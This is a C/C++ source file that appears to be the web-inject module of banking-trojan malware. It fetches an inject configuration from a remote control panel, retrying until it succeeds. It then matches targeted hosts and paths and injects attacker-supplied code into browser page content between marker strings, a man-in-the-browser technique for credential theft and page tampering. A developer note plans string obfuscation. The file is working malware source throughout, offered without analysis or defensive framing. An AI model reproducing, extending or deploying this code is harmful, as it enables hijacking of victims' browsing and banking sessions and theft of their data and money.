#include "WebInjects.h"
#include "BrowserUtils.h"

static AiJson *json   = NULL;
static BOOL    loaded = FALSE;

//todo: obfuscate strings

void LoadWebInjects()
{
   if(loaded)
      return;
   char  request[32] = { 0 };
   Funcs::pLstrcpyA(request, Strs::injectsRequest);
   char *jsonStr = PanelRequest(request, NULL);
   if(!(json = AiJsonParse(jsonStr)))
      goto err;
   if(json->error != AI_JSON_E_OK)
      goto err;
   if(json->root.type != AI_JSON_OBJECT)
      goto err;
   loaded = TRUE;
   return;
err:
   Funcs::pFree(jsonStr);
   AiJsonDestroy(json);
   Funcs::pSleep(POLL);
   LoadWebInjects();
}

static AiListNode *GetFirstNode(char *name)
{
   AiList      *object     = ((AiList *) json->root.data.object);
   AiJsonValue *currValue = AiJsonGetValueObject(object, name);
   if(!currValue)
      return NULL;

   if(currValue->type != AI_JSON_ARRAY)
      return NULL;

   return currValue->data.array->first;
}

BOOL UrlIsBlacklisted(char *url)
{
   if(!loaded)
      return NULL;

   AiListNode *curr = GetFirstNode("fg_blacklist");
   while(curr)
   {
      AiJsonValue *blacklistedUrlMask = (AiJsonValue *) curr->data;
      if(blacklistedUrlMask->type != AI_JSON_STRING)
         goto next;

      if(WildCardStrCmp(blacklistedUrlMask->data.string, url, TRUE, TRUE))
         return TRUE;
next:
      curr = curr->next;
   }
   return FALSE;
}

AiList *GetWebInject(char *host, char *path)
{
   if(!loaded)
      return NULL;

   AiListNode *curr = GetFirstNode("injects");
  
   while(curr)
   {
      AiJsonValue *object = (AiJsonValue *) curr->data;
      if(object->type != AI_JSON_OBJECT)
         goto next;

      AiJsonValue *url = AiJsonGetValueObject(object->data.object, "host");
      if(!url || url->type != AI_JSON_STRING)
         goto next;

      AiJsonValue *uri = AiJsonGetValueObject(object->data.object, "path");
      if(!uri || uri->type != AI_JSON_STRING)
         goto next;

      AiJsonValue *code = AiJsonGetValueObject(object->data.object, "content");
      if(!code || code->type != AI_JSON_ARRAY || !code->data.array->len)
         goto next;

      if((!host || WildCardStrCmp(url->data.string, host, TRUE, TRUE)) && 
         (!path || WildCardStrCmp(uri->data.string, path, TRUE, TRUE)))
      {
         return code->data.array;
      }
next:
      curr = curr->next;
   }
   return NULL; 
}

void ReplaceWebInjects(char **buffer, AiList *injects)
{
  if(!injects || !buffer)
      return;
   AiListNode *curr = injects->first;
   while(curr)
   {
      AiJsonValue *object = (AiJsonValue *) curr->data;
      if(object->type != AI_JSON_OBJECT)
         goto next;

      AiJsonValue *replace = AiJsonGetValueObject(object->data.object, "code");
      if(!replace || replace->type != AI_JSON_STRING)
         goto next;

      AiJsonValue *before = AiJsonGetValueObject(object->data.object, "before");
      if(!before || before->type != AI_JSON_STRING)
         goto next;

      AiJsonValue *after = AiJsonGetValueObject(object->data.object, "after");
      if(!after || after->type != AI_JSON_STRING)
         goto next;

      ReplaceBeforeAfter(buffer, replace->data.string, before->data.string, after->data.string);
next:
      curr = curr->next;
   }
}